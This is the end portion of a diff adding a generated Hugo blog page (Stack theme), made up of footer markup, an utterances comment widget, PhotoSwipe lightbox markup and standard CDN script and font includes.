+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
